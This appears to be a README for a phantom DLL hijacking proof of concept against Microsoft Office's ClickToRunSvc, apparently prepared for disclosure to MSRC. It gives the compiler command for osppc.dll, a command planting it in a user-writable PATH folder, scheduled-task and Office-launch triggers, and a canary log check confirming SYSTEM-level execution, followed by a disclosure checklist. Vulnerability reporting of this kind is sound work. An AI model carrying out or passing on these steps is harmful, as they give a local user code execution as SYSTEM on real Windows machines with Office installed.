# V7 GOLF — Phantom DLL (osppc.dll / ClickToRunSvc)

## Build
```cmd
vcvars64.bat
cl.exe phantom_dll_annotated.c /Fe:osppc.dll /LD /O1 /GS- /utf-8
```

## Deploy
```cmd
copy osppc.dll "C:\Users\%USERNAME%\.local\bin\"
```

## Trigger
```cmd
REM Wait for daily Office update, or:
schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"
REM Or launch any Office application
```

## Verify
```cmd
type C:\Windows\Temp\osp_telemetry.log
```
Expected: `timestamp|SYSTEM|elev=1|pid=XXXX|PHANTOM_OSPPC|...\OfficeClickToRun.exe`

## Signature Set: GOLF
- XOR Key: 0x19
- Canary: `C:\Windows\Temp\osp_telemetry.log`
- Tag: `PHANTOM_OSPPC`

## MSRC Confirmation Checklist
- [ ] Process Monitor capture showing ClickToRunSvc searching PATH for osppc.dll
- [ ] Canary file shows SYSTEM execution
- [ ] Host process path confirms OfficeClickToRun.exe loaded the DLL
- [ ] Reproducible on clean Windows 11 install with Office
